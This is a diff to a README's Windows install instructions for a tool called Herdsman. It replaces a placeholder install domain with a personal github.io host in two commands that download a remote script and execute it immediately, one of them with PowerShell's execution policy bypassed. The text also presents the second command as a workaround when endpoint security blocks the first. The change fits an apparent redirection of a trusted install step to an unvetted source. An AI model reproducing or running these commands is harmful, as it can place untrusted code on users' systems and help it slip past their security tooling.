@@ -10,13 +10,13 @@ Herdsman on Windows uses ConPTY and Windows process/runtime behavior instead of 
 Install Herdsman natively on Windows with PowerShell:
 
 ```powershell
-powershell -ExecutionPolicy Bypass -c "irm https://herdsman.invalid/install.ps1 | iex"
+powershell -ExecutionPolicy Bypass -c "irm https://remziduzagac.github.io/herdsman/install.ps1 | iex"
 ```
 
 If endpoint security blocks that fileless PowerShell command, open Command Prompt and run:
 
 ```cmd
-curl.exe -fsSLo install.cmd https://herdsman.invalid/install.cmd && install.cmd && del install.cmd
+curl.exe -fsSLo install.cmd https://remziduzagac.github.io/herdsman/install.cmd && install.cmd && del install.cmd
 ```
 
 Windows builds are available through both stable and preview update channels. New installs use stable by default, and stable is recommended for normal use. Existing preview installs stay on preview until you run `herdsman channel set stable`. If an older preview build rejects that command, run `herdsman update` once on preview and retry. Preview provides newer, less-tested fixes from `master` and may regress; opt in with `herdsman channel set preview` only when you want that tradeoff.
